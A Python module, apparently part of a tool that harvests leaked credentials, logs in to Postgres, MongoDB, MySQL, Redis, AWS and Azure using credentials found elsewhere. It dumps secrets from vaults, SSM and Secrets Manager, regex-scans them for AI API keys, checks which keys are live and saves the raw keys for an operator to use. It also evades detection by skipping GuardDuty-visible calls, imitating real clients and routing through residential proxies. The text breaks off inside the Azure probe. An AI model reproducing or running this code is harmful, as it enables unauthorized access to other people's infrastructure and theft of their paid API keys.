"""
Active jackpot-probe for validated infra credentials.

For each is_validated=1 row in infra_findings, attempt to authenticate against
the actual service and inventory what's behind it — specifically searching
for AI-provider API keys stored INSIDE the infrastructure (in DB rows,
SSM Parameter Store, Secrets Manager, blob storage). These keys are NOT in
the public repo and are usually high-balance production keys belonging to
the owner.

Probes implemented:
  postgres  →  list tables, sample suspicious ones, regex AI-keys in values
  mongo     →  list collections, sample, regex
  redis     →  SCAN for token-shaped keys, GET, regex
  aws       →  SSM:DescribeParameters + SecretsManager:ListSecrets +
               GetSecretValue on first 30, regex AI-keys

Evomi SOCKS5 fallback:
  When direct TCP fails (connection refused / timeout / DNS), retry the
  TCP handshake via Evomi proxy with country rotation (US, DE).
  ⚠️ Only the bare TCP check goes via proxy — the actual DB/SDK protocol
  uses direct connection only (proxying postgres-wire/mongo-wire/etc via
  SOCKS5 is fragile across libraries and not worth the complexity).
  Validated-via-proxy creds get connect_route='proxy:XX' and we skip the
  jackpot probe (needs direct DB-protocol).

Output (per row, stored to infra_findings.jackpot_data as JSON):
  {
    "probe_type": "postgres",
    "connect_route": "direct" | "proxy:US",
    "schemas_count": 4,
    "tables_count": 87,
    "suspicious_tables": ["users", "api_keys", "secrets"],
    "ai_keys_found": {"openai": 3, "anthropic": 1, "google": 12},
    "ai_keys_total": 16,
    "previews": ["sk-proj-abc...xyz", "sk-ant-api03-de...123", ...],
    "score": 87,
  }
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse

log = logging.getLogger(__name__)


# ── Key patterns to scan inside infra ────────────────────────────────────────
# Reuse the highest-confidence prefix-only patterns from patterns.py so we
# don't pull in the full extractor pipeline (which needs context anchors that
# don't exist in raw DB rows).
_KEY_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r'sk-proj-[A-Za-z0-9_\-]{40,220}'),       'openai'),
    (re.compile(r'sk-svcacct-[A-Za-z0-9_\-]{40,220}'),    'openai'),
    (re.compile(r'sk-admin-[A-Za-z0-9_\-]{100,200}'),     'openai'),
    (re.compile(r'sk-ant-api03-[A-Za-z0-9_\-]{90,130}'),  'anthropic'),
    (re.compile(r'sk-or-v1-[a-f0-9]{64}'),                'openrouter'),
    (re.compile(r'AIzaSy[A-Za-z0-9_\-]{33}'),             'google'),
    (re.compile(r'(?<![A-Za-z0-9])csk-[a-f0-9]{40}'),     'cerebras'),
    (re.compile(r'(?<![A-Za-z0-9_])gsk_[A-Za-z0-9]{50,60}'), 'groq'),
    (re.compile(r'(?<![A-Za-z0-9_])hf_[A-Za-z0-9]{34,50}'), 'huggingface'),
    (re.compile(r'(?<![A-Za-z0-9_\-])xai-[A-Za-z0-9]{60,90}'), 'grok'),
    (re.compile(r'(?<![A-Za-z0-9])pplx-[a-f0-9]{48,64}'), 'perplexity'),
    (re.compile(r'(?<![A-Za-z0-9_])r8_[A-Za-z0-9]{35,55}'), 'replicate'),
    (re.compile(r'(?<![A-Za-z0-9_])fw_[A-Za-z0-9]{30,60}'), 'fireworks'),
    (re.compile(r'(?<![A-Za-z0-9_])tlk_[A-Za-z0-9]{20,40}'), 'twelvelabs'),
    # legacy OpenAI / Stability collision — flagged as "openai_or_stability"
    (re.compile(r'(?<![A-Za-z0-9])sk-[A-Za-z0-9]{48}(?![A-Za-z0-9])'), 'sk48_ambiguous'),
]

# Suspicious table/collection name patterns — heightened priority for sampling.
# Expanded 2026-05-04 after audit revealed Supabase-managed auth.* tables
# dominated probes but real user keys live in public.*_settings / *_config /
# *_logs / *_payloads / chat / bot / prompt / automation / workflow tables.
_SUSPICIOUS_NAME = re.compile(
    r'(?:^|_)(?:'
    r'user|users|account|accounts|api_?key|api_?token|secret|secrets'
    r'|token|tokens|credential|credentials|oauth|webhook|webhooks'
    r'|integration|integrations|env|config|configuration|configurations'
    r'|setting|settings|connection|connections|provider|providers'
    r'|log|logs|payload|payloads|notification|notifications'
    r'|chat|chats|bot|bots|prompt|prompts|automation|automations'
    r'|workflow|workflows|message|messages|event|events'
    r'|profile|profiles|customer|customers|client|clients'
    r'|app|apps|service|services|llm|model|models'
    r'|ai_|_ai$|_key$|_secret$|_token$|_pass'
    r')s?(?:$|_)',
    re.IGNORECASE,
)

# Generic-table caps (broad sampling) and suspicious-table caps (deep sampling).
_GENERIC_TABLE_LIMIT     = 10
_SUSPICIOUS_TABLE_LIMIT  = 100
_TOTAL_TABLES_TO_SCAN    = 50    # cap per DB to bound probe time


def _scan_text(text: str) -> tuple[dict[str, int], list[str], dict[str, list[str]]]:
    """Run all patterns over text.
    Returns (counts_per_provider, masked_previews_for_storage, raw_keys_per_provider).
    raw_keys_per_provider is capped at 20 per provider to bound downstream
    validation cost; the masked previews remain for safe storage."""
    counts: dict[str, int] = {}
    previews: list[str] = []
    raw: dict[str, list[str]] = {}
    seen: set[str] = set()
    for pat, prov in _KEY_PATTERNS:
        for m in pat.finditer(text or ""):
            k = m.group(0)
            if k in seen:
                continue
            seen.add(k)
            counts[prov] = counts.get(prov, 0) + 1
            if len(raw.get(prov, [])) < 20:
                raw.setdefault(prov, []).append(k)
            if len(previews) < 10:
                if len(k) > 24:
                    previews.append(f"{k[:12]}...{k[-6:]}")
                else:
                    previews.append(k[:8] + "...")
    return counts, previews, raw


# ── Financial-exposure estimate (typical paid-tier monthly spend per key) ──
# Numbers are conservative averages of leaked-key research from 2024-2026:
# we don't claim per-key exact balance (would require auth into each), but
# this gives the disclosure recipient a credible "if these are production
# keys you're looking at $X/mo unauthorized usage" framing.
_KEY_VALUE_USD: dict[str, int] = {
    "openai":              400,   # paid-tier prod default; sk-proj-/sk-svcacct- often higher
    "sk48_ambiguous":      300,   # legacy openai or stability — split between
    "anthropic":           500,   # claude-opus prod usage
    "google":              100,   # gemini paid; free tier has hard quota
    "openrouter":          200,
    "cerebras":            150,
    "deepseek":             80,
    "groq":                 50,
    "huggingface":          80,
    "grok":                150,
    "perplexity":           50,
    "replicate":           100,
    "fireworks":            80,
    "twelvelabs":          120,
}


def _estimate_exposure_usd(validated_counts: dict[str, int]) -> int:
    return sum(_KEY_VALUE_USD.get(p, 50) * n for p, n in validated_counts.items())


async def _validate_discovered_keys(
    raw: dict[str, list[str]],
) -> tuple[dict[str, int], list[tuple[str, str]]]:
    """Run each discovered key through its validator.

    Returns (counts_per_provider, validated_pairs) where validated_pairs is
    a list of (provider, raw_key) for keys confirmed LIVE. The raw keys are
    later persisted to found_keys by run_jackpot_cycle so the operator can
    retrieve them, revalidate them, and feed them to /api/keys rotation.
    Capped at 10 keys per provider to bound time."""
    if not raw:
        return {}, []
    try:
        from validators import VALIDATORS
    except Exception as e:
        log.debug("validators import failed: %s", e)
        return {}, []

    sem = asyncio.Semaphore(10)
    counts: dict[str, int] = {}
    validated_pairs: list[tuple[str, str]] = []
    lock = asyncio.Lock()

    async def _check(prov: str, key: str):
        prov_for_validator = "openai" if prov == "sk48_ambiguous" else prov
        v = VALIDATORS.get(prov_for_validator)
        if not v:
            return
        async with sem:
            try:
                ok = await asyncio.wait_for(v(key), timeout=15)
            except Exception:
                return
            if ok:
                # ambiguous → try stability if openai validated against stability shape
                final_prov = prov_for_validator
                if prov == "sk48_ambiguous":
                    # We don't know definitively which one; tag as openai
                    # (operator can re-tag if needed; the raw key is what matters)
                    final_prov = "openai"
                async with lock:
                    counts[final_prov] = counts.get(final_prov, 0) + 1
                    validated_pairs.append((final_prov, key))

    tasks = []
    for prov, keys in raw.items():
        for k in keys[:10]:
            tasks.append(_check(prov, k))
    await asyncio.gather(*tasks, return_exceptions=True)
    return counts, validated_pairs




def _compute_jackpot_score(probe_type: str, data: dict) -> int:
    """0-100 — probability that this infra hosts live, financially-meaningful
    AI keys. Validated keys dominate; raw counts only contribute when no
    validation took place.

    Tiers we want:
      ≥80   "JACKPOT" — multiple validated keys + production indicators
      60-79 "high"    — at least one validated key OR many raw + susp tables
      40-59 "medium"  — raw keys present but none validated
      <40   noise / metadata only
    """
    score = 0
    valid = data.get("ai_keys_total_valid", 0)
    raw   = data.get("ai_keys_total", 0)
    if valid > 0:
        score += min(60, 30 + valid * 10)         # +40..+60 based on count
    elif raw > 0:
        score += min(35, 5 + raw * 3)             # raw-only = lower ceiling
    if data.get("suspicious_tables"):
        score += min(20, 5 * len(data["suspicious_tables"]))
    # Production indicators
    text_blob = (
        " ".join(data.get("suspicious_tables", []))
        + " " + " ".join(data.get("databases", []))
    ).lower()
    for kw, w in [("production", 15), ("prod", 10), ("live", 8), ("public", 5)]:
        if kw in text_blob:
            score += w
            break
    # Very large data volume = serious infra
    cnt = data.get("tables_count") or data.get("collections_count") or data.get("ssm_params") or 0
    if cnt > 100:
        score += 5
    # Cloud-native indicators
    if data.get("ssm_params", 0) > 0 or data.get("sm_secrets", 0) > 0:
        score += 5
    return max(0, min(100, score))


# ── Evomi HTTP-CONNECT proxy helper (TCP tunnel) ─────────────────────────────
# User's Railway env exposes EVOMI_PROXY in HTTP format:
#   http://USER:PASS_country-XX@core-residential.evomi.com:1000
# Country rotation is done by substituting the _country-XX suffix in USER.
# python-socks transparently supports HTTP CONNECT via proxy_type='http'.

import re as _re_jp
_COUNTRY_SUFFIX = _re_jp.compile(r'_country-[A-Za-z]{2}')


def _evomi_url_for_country(country: str) -> str | None:
    """Rebuild EVOMI_PROXY url with the requested country suffix.
    Returns None if EVOMI_PROXY is not configured."""
    from config import EVOMI_PROXY, EVOMI_USER, EVOMI_PASS
    if EVOMI_PROXY:
        if _COUNTRY_SUFFIX.search(EVOMI_PROXY):
            return _COUNTRY_SUFFIX.sub(f"_country-{country.upper()}", EVOMI_PROXY)
        # No country suffix in URL — inject before @
        # Format: scheme://user:pass@host → scheme://user_country-XX:pass@host
        m = _re_jp.match(r"^(\w+://)([^:]+):([^@]+)@(.+)$", EVOMI_PROXY)
        if m:
            return f"{m.group(1)}{m.group(2)}_country-{country.upper()}:{m.group(3)}@{m.group(4)}"
        return EVOMI_PROXY
    if EVOMI_USER and EVOMI_PASS:
        return f"http://{EVOMI_USER}_country-{country.upper()}:{EVOMI_PASS}@core-residential.evomi.com:1000"
    return None


async def _tcp_via_proxy(host: str, port: int, country: str,
                         timeout: float = 10.0) -> bool:
    """Probe TCP reachability via Evomi HTTP-CONNECT proxy from given country."""
    try:
        from python_socks.async_.asyncio import Proxy
    except ImportError:
        log.warning("python_socks not installed — proxy fallback disabled")
        return False

    url = _evomi_url_for_country(country)
    if not url:
        return False

    try:
        proxy = Proxy.from_url(url)
        sock = await asyncio.wait_for(
            proxy.connect(dest_host=host, dest_port=port, timeout=timeout),
            timeout=timeout + 2,
        )
        sock.close()
        return True
    except Exception as e:
        log.debug("evomi proxy probe %s:%d via %s: %s", host, port, country, e)
        return False


async def _direct_tcp(host: str, port: int, timeout: float = 6.0) -> bool:
    try:
        _, w = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
        w.close()
        try:
            await w.wait_closed()
        except Exception:
            pass
        return True
    except Exception:
        return False


async def reachability_check(host: str, port: int) -> tuple[bool, str]:
    """Returns (reachable, route_label).
    route_label ∈ {'direct', 'proxy:US', 'proxy:DE', ''}"""
    if await _direct_tcp(host, port):
        return True, "direct"
    for cc in ("US", "DE"):
        if await _tcp_via_proxy(host, port, cc):
            return True, f"proxy:{cc}"
    return False, ""


# ── Postgres probe ──────────────────────────────────────────────────────────

async def probe_postgres(cred: str) -> dict:
    """
    Connect via asyncpg, list schemas/tables, sample suspicious ones,
    regex-scan for AI keys.

    Quiet-mode hygiene (DeepSeek recommendations):
      - first command is 'SELECT 1' (mimics real client probe)
      - 500ms pause before heavy information_schema queries
      - never queries pg_stat_statements / pg_user (admin-suspicious)
    """
    try:
        import asyncpg
    except ImportError:
        return {"error": "asyncpg_missing"}

    parsed = urlparse(cred)
    host = parsed.hostname
    if not host:
        return {"error": "no_host"}

    out: dict[str, Any] = {
        "probe_type": "postgres",
        "schemas_count": 0,
        "tables_count": 0,
        "suspicious_tables": [],
        "databases": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }

    try:
        # asyncpg accepts the full URI directly; normalize the scheme so
        # postgres+asyncpg:// -> postgres://
        clean = re.sub(r"^postgres(?:ql)?\+\w+://", "postgresql://", cred)
        clean = re.sub(r"^postgres://", "postgresql://", clean)
        conn = await asyncio.wait_for(
            asyncpg.connect(clean, timeout=8, command_timeout=10),
            timeout=12,
        )
    except Exception as e:
        return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}

    try:
        # Warm-up: lightweight SELECT 1 (look like a real client) + 500ms pause
        try:
            await asyncio.wait_for(conn.fetchval("SELECT 1"), timeout=5)
        except Exception:
            pass
        await asyncio.sleep(0.5)

        # ── Supabase Vault — top priority probe ──────────────────────────
        # vault.decrypted_secrets returns plaintext for user-stored secrets
        # (OPENAI_API_KEY, STRIPE_KEY, etc registered via dashboard).
        # Highest-precision target: when accessible, almost guaranteed live keys.
        vault_text: list[str] = []
        try:
            vault_rows = await asyncio.wait_for(
                conn.fetch("SELECT name, decrypted_secret FROM vault.decrypted_secrets LIMIT 200"),
                timeout=8,
            )
            for vr in vault_rows or []:
                vault_text.append(str(vr.get("name") or ""))
                vault_text.append(str(vr.get("decrypted_secret") or ""))
            if vault_rows:
                out["supabase_vault_count"] = len(vault_rows)
        except Exception:
            pass   # vault schema not present or no access — fine

        # auth.secrets — Supabase shared secrets table
        try:
            auth_rows = await asyncio.wait_for(
                conn.fetch("SELECT * FROM auth.secrets LIMIT 100"),
                timeout=6,
            )
            for ar in auth_rows or []:
                for v in ar.values():
                    if v is not None:
                        vault_text.append(str(v))
        except Exception:
            pass

        # List schemas
        schemas = await conn.fetch(
            "SELECT schema_name FROM information_schema.schemata "
            "WHERE schema_name NOT IN ('pg_catalog','information_schema','pg_toast') "
            "AND schema_name NOT LIKE 'pg_temp%'"
        )
        out["schemas_count"] = len(schemas)

        # List tables across all non-system schemas
        tables = await conn.fetch(
            "SELECT table_schema, table_name FROM information_schema.tables "
            "WHERE table_type='BASE TABLE' AND table_schema NOT IN "
            "('pg_catalog','information_schema','pg_toast') "
            "ORDER BY table_schema, table_name"
        )
        out["tables_count"] = len(tables)

        # Pick suspicious tables first, then fill with generic up to cap
        ranked = sorted(
            tables,
            key=lambda r: 0 if _SUSPICIOUS_NAME.search(r["table_name"]) else 1,
        )[:_TOTAL_TABLES_TO_SCAN]
        suspicious_names: list[str] = []

        all_text = []
        for r in ranked:
            tname = f'"{r["table_schema"]}"."{r["table_name"]}"'
            is_susp = bool(_SUSPICIOUS_NAME.search(r["table_name"]))
            limit = _SUSPICIOUS_TABLE_LIMIT if is_susp else _GENERIC_TABLE_LIMIT
            if is_susp:
                suspicious_names.append(f"{r['table_schema']}.{r['table_name']}")
            try:
                rows = await asyncio.wait_for(
                    conn.fetch(f"SELECT * FROM {tname} LIMIT {limit}"),
                    timeout=8,
                )
            except Exception:
                continue
            for row in rows:
                # Stringify all column values
                for v in row.values():
                    if v is None:
                        continue
                    s = str(v)
                    if len(s) > 4 and len(s) < 4096:
                        all_text.append(s)

        out["suspicious_tables"] = suspicious_names[:30]
        # Vault content prepended — its hits are extremely high-confidence
        text = "\n".join(vault_text + all_text)
        counts, previews, raw = _scan_text(text)
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        # Validate first 10 of each provider — establish "live keys exist"
        validated, validated_pairs = await _validate_discovered_keys(raw)
        out["ai_keys_validated"] = validated
        out["ai_keys_total_valid"] = sum(validated.values())
        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
        out["_validated_pairs"] = validated_pairs   # consumed by run_jackpot_cycle for found_keys save

    except Exception as e:
        out["error"] = f"query:{type(e).__name__}"
        out["msg"] = str(e)[:120]
    finally:
        try:
            await conn.close()
        except Exception:
            pass

    return out


# ── MongoDB probe ───────────────────────────────────────────────────────────

async def probe_mongo(cred: str) -> dict:
    """Quiet-mode hygiene: 'ping' first + 500ms pause before listDatabases."""
    try:
        import motor.motor_asyncio
    except ImportError:
        return {"error": "motor_missing"}

    out: dict[str, Any] = {
        "probe_type": "mongo",
        "databases": [],
        "collections_count": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    try:
        client = motor.motor_asyncio.AsyncIOMotorClient(
            cred, serverSelectionTimeoutMS=8000, connectTimeoutMS=8000,
        )
        # Warmup ping — looks like a real driver-level liveness probe
        try:
            await asyncio.wait_for(
                client.admin.command("ping"), timeout=5
            )
        except Exception:
            pass
        await asyncio.sleep(0.5)
        db_names = await asyncio.wait_for(
            client.list_database_names(), timeout=10
        )
    except Exception as e:
        return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}

    try:
        # Skip system DBs
        target_dbs = [d for d in db_names if d not in ("admin", "config", "local")]
        out["databases"] = target_dbs[:30]

        all_text = []
        suspicious = []
        scanned = 0
        for dbn in target_dbs:
            if scanned >= _TOTAL_TABLES_TO_SCAN:
                break
            db = client[dbn]
            colls = await db.list_collection_names()
            out["collections_count"] += len(colls)
            ranked = sorted(
                colls, key=lambda c: 0 if _SUSPICIOUS_NAME.search(c) else 1
            )
            for c in ranked:
                if scanned >= _TOTAL_TABLES_TO_SCAN:
                    break
                is_susp = bool(_SUSPICIOUS_NAME.search(c))
                limit = _SUSPICIOUS_TABLE_LIMIT if is_susp else _GENERIC_TABLE_LIMIT
                if is_susp:
                    suspicious.append(f"{dbn}.{c}")
                try:
                    docs = await db[c].find({}).limit(limit).to_list(limit)
                except Exception:
                    continue
                for doc in docs:
                    all_text.append(json.dumps(doc, default=str))
                scanned += 1

        out["suspicious_tables"] = suspicious[:30]
        counts, previews, raw = _scan_text("\n".join(all_text))
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        validated, validated_pairs = await _validate_discovered_keys(raw)
        out["ai_keys_validated"] = validated
        out["ai_keys_total_valid"] = sum(validated.values())
        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
        out["_validated_pairs"] = validated_pairs
    except Exception as e:
        out["error"] = f"query:{type(e).__name__}"
        out["msg"] = str(e)[:120]
    finally:
        try:
            client.close()
        except Exception:
            pass
    return out


# ── MySQL / MariaDB probe ───────────────────────────────────────────────────

async def probe_mysql(cred: str) -> dict:
    """Same pattern as postgres but via aiomysql. Quiet-mode warmup
    (SELECT 1 + 500ms) before information_schema queries."""
    try:
        import aiomysql
    except ImportError:
        return {"error": "aiomysql_missing"}

    parsed = urlparse(cred)
    host = parsed.hostname
    if not host:
        return {"error": "no_host"}
    port = parsed.port or 3306
    user = parsed.username or "root"
    password = parsed.password or ""
    db_name = (parsed.path or "/").lstrip("/")

    out: dict[str, Any] = {
        "probe_type": "mysql",
        "schemas_count": 0,
        "tables_count": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }

    try:
        conn = await asyncio.wait_for(
            aiomysql.connect(
                host=host, port=port, user=user, password=password,
                db=db_name or None, connect_timeout=8, autocommit=True,
            ),
            timeout=12,
        )
    except Exception as e:
        return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}

    try:
        cur = await conn.cursor()

        # Warmup: SELECT 1 + 500ms (real-client mimicry)
        try:
            await asyncio.wait_for(cur.execute("SELECT 1"), timeout=5)
            await cur.fetchone()
        except Exception:
            pass
        await asyncio.sleep(0.5)

        # List schemas (skip MySQL system DBs)
        await cur.execute(
            "SELECT schema_name FROM information_schema.schemata "
            "WHERE schema_name NOT IN ('mysql','sys','performance_schema',"
            "'information_schema')"
        )
        schemas = await cur.fetchall()
        out["schemas_count"] = len(schemas)

        # List all tables
        await cur.execute(
            "SELECT table_schema, table_name FROM information_schema.tables "
            "WHERE table_type='BASE TABLE' AND table_schema NOT IN "
            "('mysql','sys','performance_schema','information_schema')"
        )
        tables = await cur.fetchall()
        out["tables_count"] = len(tables)

        ranked = sorted(
            tables,
            key=lambda r: 0 if _SUSPICIOUS_NAME.search(r[1]) else 1,
        )[:_TOTAL_TABLES_TO_SCAN]
        suspicious_names: list[str] = []
        all_text = []

        for schema, tname in ranked:
            full = f"`{schema}`.`{tname}`"
            is_susp = bool(_SUSPICIOUS_NAME.search(tname))
            limit = _SUSPICIOUS_TABLE_LIMIT if is_susp else _GENERIC_TABLE_LIMIT
            if is_susp:
                suspicious_names.append(f"{schema}.{tname}")
            try:
                await asyncio.wait_for(
                    cur.execute(f"SELECT * FROM {full} LIMIT {limit}"),
                    timeout=8,
                )
                rows = await cur.fetchall()
            except Exception:
                continue
            for row in rows:
                for v in row:
                    if v is None:
                        continue
                    s = str(v)
                    if 4 < len(s) < 4096:
                        all_text.append(s)

        await cur.close()
        out["suspicious_tables"] = suspicious_names[:30]
        text = "\n".join(all_text)
        counts, previews, raw = _scan_text(text)
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        validated, validated_pairs = await _validate_discovered_keys(raw)
        out["ai_keys_validated"] = validated
        out["ai_keys_total_valid"] = sum(validated.values())
        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
        out["_validated_pairs"] = validated_pairs
    except Exception as e:
        out["error"] = f"query:{type(e).__name__}"
        out["msg"] = str(e)[:120]
    finally:
        try:
            conn.close()
        except Exception:
            pass

    return out


# ── Redis probe ─────────────────────────────────────────────────────────────

async def probe_redis(cred: str) -> dict:
    try:
        import redis.asyncio as aioredis
    except ImportError:
        return {"error": "redis_missing"}

    out: dict[str, Any] = {
        "probe_type": "redis",
        "key_count": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }
    try:
        client = aioredis.from_url(cred, decode_responses=True,
                                    socket_connect_timeout=8,
                                    socket_timeout=8)
        info = await asyncio.wait_for(client.info("keyspace"), timeout=10)
        # info is dict like {'db0': {'keys': 123, ...}}
        total = sum(d.get("keys", 0) for d in info.values()
                    if isinstance(d, dict))
        out["key_count"] = total
    except Exception as e:
        return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}

    try:
        # SCAN with MATCH for suspicious key patterns. Limit scan time.
        all_text = []
        susp_keys = []
        deadline = asyncio.get_event_loop().time() + 30  # 30s budget
        for pattern in (
            "*token*", "*secret*", "*key*", "*api*", "*credential*",
            "*oauth*", "*openai*", "*anthropic*", "*ai_*",
        ):
            if asyncio.get_event_loop().time() > deadline:
                break
            try:
                async for k in client.scan_iter(match=pattern, count=200):
                    if asyncio.get_event_loop().time() > deadline:
                        break
                    if len(susp_keys) >= 200:
                        break
                    susp_keys.append(k)
            except Exception:
                continue

        out["suspicious_tables"] = susp_keys[:30]

        # Read values
        for k in susp_keys[:200]:
            try:
                v = await client.get(k)
                if v:
                    all_text.append(str(v))
                    all_text.append(str(k))
            except Exception:
                # Might be hash/list/set; try those
                try:
                    t = await client.type(k)
                    if t == "hash":
                        h = await client.hgetall(k)
                        all_text.append(json.dumps(h, default=str))
                    elif t == "list":
                        lst = await client.lrange(k, 0, 50)
                        all_text.extend(str(x) for x in lst)
                except Exception:
                    pass

        counts, previews, raw = _scan_text("\n".join(all_text))
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        validated, validated_pairs = await _validate_discovered_keys(raw)
        out["ai_keys_validated"] = validated
        out["ai_keys_total_valid"] = sum(validated.values())
        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
        out["_validated_pairs"] = validated_pairs
    except Exception as e:
        out["error"] = f"query:{type(e).__name__}"
        out["msg"] = str(e)[:120]
    finally:
        try:
            await client.aclose()
        except Exception:
            pass
    return out


# ── AWS probe (SSM Parameter Store + Secrets Manager) ───────────────────────

async def probe_aws(cred: str) -> dict:
    """Quiet-mode (DeepSeek hygiene):
      - SKIP sts.get_caller_identity (huge GuardDuty signal). Use
        ssm.describe_parameters(MaxItems=1) as liveness probe instead —
        same liveness signal, one CloudTrail event vs identifying call.
      - SINGLE region us-east-1 only (most accounts hold secrets there).
      - List secrets WITHOUT decryption; filter names by suspicion regex;
        only GetSecretValue on suspicious-named ones (typically 2-5 of 30
        instead of all 30).
    """
    try:
        import boto3
        from botocore.exceptions import ClientError
        from botocore.config import Config as BotoConfig
    except ImportError:
        return {"error": "boto3_missing"}

    m = re.match(r"^(AKIA[A-Z0-9]+|ASIA[A-Z0-9]+|AKIAJ[A-Z0-9]+):([^@]+)", cred)
    if not m:
        return {"error": "format"}
    kid, secret = m.group(1), m.group(2)
    if len(secret) < 20:
        return {"error": "format"}

    out: dict[str, Any] = {
        "probe_type": "aws",
        "ssm_params": 0,
        "sm_secrets": 0,
        "s3_buckets": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }

    def _do_sync():
        cfg = BotoConfig(retries={"max_attempts": 1, "mode": "standard"},
                          connect_timeout=8, read_timeout=10)
        REGION = "us-east-1"

        # Liveness probe via SSM (no GetCallerIdentity → no GuardDuty alert)
        ssm = boto3.client("ssm", aws_access_key_id=kid,
                            aws_secret_access_key=secret,
                            region_name=REGION, config=cfg)
        try:
            ssm.describe_parameters(MaxResults=1)
        except ClientError as e:
            code = e.response.get("Error", {}).get("Code", "")
            if code in ("InvalidClientTokenId", "AuthFailure", "UnrecognizedClientException"):
                return {"error": "invalid_token"}
            # AccessDenied / SignatureDoesNotMatch = key real but no SSM perm
            return {"error": "no_ssm_access", "code": code}
        # Key is alive. Now enumerate.

        text_blob: list[str] = []
        susp: list[str] = []

        # Full SSM enumeration — names only first
        ssm_count = 0
        param_names: list[str] = []
        try:
            for page in ssm.get_paginator("describe_parameters").paginate(
                PaginationConfig={"MaxItems": 500}
            ):
                for p in page.get("Parameters", []):
                    ssm_count += 1
                    param_names.append(p.get("Name", ""))
            out["ssm_params"] = ssm_count
        except ClientError:
            pass

        # Filter to suspicious names → only those get decrypted
        for name in param_names:
            if not _SUSPICIOUS_NAME.search(name):
                continue
            susp.append(f"ssm:{name}")
            try:
                val = ssm.get_parameter(Name=name, WithDecryption=True)
                v = val.get("Parameter", {}).get("Value", "")
                if v:
                    text_blob.append(v)
            except ClientError:
                pass

        # Secrets Manager — same pattern
        try:
            sm = boto3.client("secretsmanager", aws_access_key_id=kid,
                               aws_secret_access_key=secret,
                               region_name=REGION, config=cfg)
            secret_arns: list[tuple[str, str]] = []
            for page in sm.get_paginator("list_secrets").paginate(
                PaginationConfig={"MaxItems": 200}
            ):
                for s in page.get("SecretList", []):
                    out["sm_secrets"] += 1
                    secret_arns.append((s.get("Name", ""), s.get("ARN", "")))
            for name, arn in secret_arns:
                # In SecretsManager the name is often abstract — read everything
                # but cap at 50 to bound time. Filter by suspicious for read.
                if not _SUSPICIOUS_NAME.search(name) and len(susp) < 50:
                    continue
                susp.append(f"sm:{name}")
                if len([s for s in susp if s.startswith("sm:")]) > 50:
                    break
                try:
                    val = sm.get_secret_value(SecretId=arn)
                    v = val.get("SecretString", "")
                    if v:
                        text_blob.append(v)
                except ClientError:
                    pass
        except ClientError:
            pass

        # S3 list (cheap, useful for bucket-name reporting)
        try:
            s3 = boto3.client("s3", aws_access_key_id=kid,
                                aws_secret_access_key=secret, config=cfg)
            buckets = s3.list_buckets().get("Buckets", [])
            out["s3_buckets"] = len(buckets)
            for b in buckets[:30]:
                bn = b.get("Name", "")
                if any(k in bn.lower() for k in ("secret", "env", "config", "prod", "key", "credential")):
                    susp.append(f"s3:{bn}")
        except ClientError:
            pass

        out["suspicious_tables"] = susp[:30]
        counts, previews, raw = _scan_text("\n".join(text_blob))
        out["ai_keys_found"] = counts
        out["ai_keys_total"] = sum(counts.values())
        out["previews"] = previews
        out["_raw_keys"] = raw
        return out

    try:
        result = await asyncio.to_thread(_do_sync)
        if isinstance(result, dict) and "_raw_keys" in result:
            raw = result.pop("_raw_keys")
            validated, validated_pairs = await _validate_discovered_keys(raw)
            result["ai_keys_validated"] = validated
            result["ai_keys_total_valid"] = sum(validated.values())
            result["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
            result["_validated_pairs"] = validated_pairs
        return result
    except Exception as e:
        return {"error": f"unhandled:{type(e).__name__}", "msg": str(e)[:120]}


# ── Azure storage probe ─────────────────────────────────────────────────────
# Connection string format:
#   DefaultEndpointsProtocol=https;AccountName=<n>;AccountKey=<key>;EndpointSuffix=core.windows.net
# Or BlobEndpoint=https://<n>.blob.core.windows.net/...

_AZURE_ACCT_RE   = re.compile(r'AccountName=([^;]+)', re.IGNORECASE)
_AZURE_KEY_RE    = re.compile(r'AccountKey=([^;]+)', re.IGNORECASE)
_AZURE_BLOB_EP_RE = re.compile(r'BlobEndpoint=https?://([^;/]+)', re.IGNORECASE)


async def probe_azure(cred: str) -> dict:
    """Azure Storage Account probe. Lists containers, samples blobs whose
    names suggest config/secrets, regex-scans for AI keys."""
    try:
        from azure.storage.blob import BlobServiceClient
        from azure.core.exceptions import HttpResponseError, ClientAuthenticationError
    except ImportError:
        return {"error": "azure_sdk_missing"}

    # Build connection string if cred is just AccountName=X;AccountKey=Y
    conn_str = cred
    if "AccountName=" in cred and "AccountKey=" in cred and "DefaultEndpointsProtocol" not in cred:
        conn_str = "DefaultEndpointsProtocol=https;" + cred + ";EndpointSuffix=core.windows.net"

    out: dict[str, Any] = {
        "probe_type": "azure_blob",
        "containers_count": 0,
        "blobs_sampled": 0,
        "suspicious_tables": [],
        "ai_keys_found": {},
        "ai_keys_total": 0,
        "previews": [],
    }

    def _do_sync():
        try:
            client = BlobServiceClient.from_connection_string(conn_str)
        except Exception as e:
            return {"error": f"parse:{type(e).__name__}", "msg": str(e)[:120]}

        text_blob: list[str] = []
        susp: list[str] = []

        try:
